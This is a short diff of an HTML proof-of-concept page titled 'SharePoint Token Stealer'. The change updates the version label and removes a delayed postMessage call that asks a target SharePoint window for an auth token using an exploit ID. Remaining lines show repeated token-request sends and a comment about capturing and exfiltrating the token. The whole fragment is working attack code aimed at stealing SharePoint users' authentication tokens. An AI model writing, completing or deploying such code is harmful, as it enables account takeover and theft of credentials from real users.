@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SharePoint PoC V2</title>
+    <title>SharePoint PoC V3</title>
 </head>
 <body>
     <h1>SharePoint Token Stealer</h1>
@@ -53,18 +53,6 @@
                 send(tokenPayload);
                 console.log("Sent token request attempt " + attempts);
             }, 1000);
-        };
-
-            // 2. Request Auth Token (after short delay)
-            setTimeout(() => {
-                const tokenPayload = {
-                    MessageId: "GetAuthToken",
-                    AddinTrustId: exploitId,
-                    Resource: window.location.origin 
-                };
-                targetWindow.postMessage(tokenPayload, targetOrigin);
-                console.log("Sent token request");
-            }, 2000);
         };
 
         // 3. Capture & Exfiltrate Token
